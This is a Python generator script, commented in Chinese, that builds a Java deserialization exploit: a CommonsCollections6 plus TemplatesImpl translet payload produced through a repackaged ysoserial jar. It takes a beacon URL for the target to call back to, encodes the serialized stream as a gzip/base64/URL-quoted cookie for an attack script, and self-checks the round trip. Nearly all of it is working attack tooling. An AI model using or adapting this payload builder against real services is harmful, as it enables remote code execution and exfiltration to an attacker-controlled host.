#!/usr/bin/env python3
"""translet_gen.py — build a cookie value from the CC6 + TemplatesImpl translet payload.

用法:
    python translet_gen.py <BEACON_URL> [SECRET_PATH]

本机没有 javac 时走 BeanShell 生成（CAMTY_TOOLS_JAR 指向的 ysoserial 重打包 jar
提供 bsh.Interpreter + javassist + commons-collections 3.x），校验原始序列化流
（magic ac ed 00 05）后按目标 cookie 格式编码:
    gzip.compress -> base64.b64encode -> urllib.parse.quote(safe="")

最终 cookie 值打到 stdout。同时写出:
    scripts/translet_raw.bin    原始序列化载荷(供本地反序列化测试)
    scripts/translet_cookie.txt cookie 值(供攻击脚本消费)

内置 self-check: cookie 解码回来必须与原始字节完全一致——
编码 bug 在这里现形，而不是在目标窗口里。
"""

import base64
import gzip
import os
import subprocess
import sys
import urllib.parse

SCRIPTS = os.path.dirname(os.path.abspath(__file__))
JAR = os.environ.get(
    "CAMTY_TOOLS_JAR",
    os.path.join(os.path.dirname(SCRIPTS), "tools", "utils-bundle.jar"),
)


def main():
    if len(sys.argv) < 2:
        sys.stderr.write("usage: translet_gen.py <BEACON_URL> [SECRET_PATH]\n")
        return 2
    beacon = sys.argv[1].strip().rstrip("/")
    bsh_script = os.path.join(SCRIPTS, "TransletGen.bsh")
    cp = JAR + os.pathsep + SCRIPTS
    cmd = ["java", "-cp", cp, "bsh.Interpreter", bsh_script, beacon]
    if len(sys.argv) > 2:
        cmd.append(sys.argv[2])

    p = subprocess.run(cmd, cwd=SCRIPTS, capture_output=True)
    if p.stderr:
        sys.stderr.write(p.stderr.decode("utf-8", "replace"))
    if p.returncode != 0:
        sys.stderr.write("[!] TransletGen failed, rc=%d\n" % p.returncode)
        return 1

    raw = p.stdout
    if not raw.startswith(b"\xac\xed\x00\x05"):
        sys.stderr.write(
            "[!] stdout is not a Java serialized stream (expected ac ed 00 05); "
            "got %d bytes, head=%r\n" % (len(raw), raw[:16])
        )
        return 1

    raw_path = os.path.join(SCRIPTS, "translet_raw.bin")
    with open(raw_path, "wb") as f:
        f.write(raw)

    cookie = urllib.parse.quote(base64.b64encode(gzip.compress(raw)).decode(), safe="")

    # self-check: cookie must decode back to exactly the raw serialized stream
    rt = gzip.decompress(base64.b64decode(urllib.parse.unquote(cookie)))
    if rt != raw:
        sys.stderr.write("[!] SELF-CHECK FAILED: cookie round-trip mismatch\n")
        return 1
    sys.stderr.write("[+] self-check OK: cookie round-trips to raw bytes (%d)\n" % len(raw))

    cookie_path = os.path.join(SCRIPTS, "translet_cookie.txt")
    with open(cookie_path, "w", encoding="utf-8") as f:
        f.write(cookie)

    sys.stdout.write(cookie + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
